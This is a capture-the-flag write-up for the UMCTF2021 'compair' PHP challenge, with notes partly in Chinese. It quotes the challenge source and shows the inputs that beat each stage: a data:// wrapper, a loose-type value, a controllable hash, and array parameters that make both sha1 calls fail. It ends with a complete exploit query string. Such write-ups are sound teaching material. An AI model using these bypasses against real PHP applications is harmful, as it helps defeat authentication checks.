# UMCTF2021 - compair

- Write-Up Author: T4rn \[[MOCTF](https://www.facebook.com/MOCSCTF)\]

- Flag:MOCSCTF{php_15_50_c0mpl3x_3333!}

## **Question:**
compair

[src](./src/index.php)

## Write up

**reference:**  
[PHP Wrappers](https://www.php.net/manual/en/wrappers.php) - PHP comes with many built-in wrappers for various URL-style protocols
[PHP comparison table](https://www.php.net/manual/en/types.comparisons.php)  
[PHP null](https://www.php.net/manual/en/language.types.null.php)

---

1. first stage
```php
// Stage 1
if (isset($_GET['text'])) {
	$text = $_GET['text'];
	if(@file_get_contents($text)!=="кеeр"){
        die("You must speak my language a different way!</br>");
	}
	echo "Stage 1 is complete! You unlocked the key: <b>".$secretkey."</b></br>";
}
```
File_get_contents的内容 用data伪协议 

>text=data://text/plain,кеeр

data:// - The data: (» RFC 2397) stream wrapper.

2. second stage
```php
// Stage 2
if (isset($_GET['key1'])) {
	$key1 = $_GET['key1'];
	$keyId = 1314;
	if (intval($key1) !== $keyId || $key1 === $keyId) {
    	die(""."what's your problem</br>");
	}
	echo "flag first part: <b>".$flag1."</b></br>";
	echo "Stage 2 is complete! Keep Going!</br>";
}
```
php弱类型的经典考察 字符串转int 使用1314a
>&key1=1314a

3. third stage
```php
// Stage 3
if (isset($_GET['hash'])&&isset($_GET['token'])&&isset($_GET['keyId'])) {
	$hash = $_GET['hash'];
	$token = intval($_GET['token']);
	if(substr(hash("sha256", $keyId + $token . $secretkey), 5, 25) == $hash) {
    	$keyId = $_GET['keyId'];
	} else {
    	die("Out!</br>");
	}
	echo "flag second part: <b>".$flag2."</b></br>";
	echo "Stage 3 is complete! You defeated death, for now...</br>";
}
```
很简单 所有的都是你可控的 你可以token置0来算hash
>&token=0&hash=173ffffa99d79bec5c4e1af35

4. final stage
```php
// stage 4
if (isset($_GET['key2'])&&isset($_GET['keyId'])) {
	$key2=$_GET['key2'];
	if ($keyId==$key2) {
		die("i don't expect they are same</br>");
	} elseif (sha1($keyId)===sha1($key2)) {
		echo "Final stage is complete Congratulations</br>";
	} else {
		die("They are even not equal..</br>");
	}
	echo "flag final part: <b>".$flag3."</b></br>";
	echo "<b>".$flag1.$flag2.$flag3."</b></br>"; 
}
```
Sha1和md5函数 可以用数组(array)截断 FALSE===FALSE
>&keyId[]=aaaa&key2[]=y

final payload

>?text=data://text/plain,кеeр&key1=1314a&token=0&hash=173ffffa99d79bec5c4e1af35&keyId[]=aaaa&key2[]=y  

![img](./img/1.png)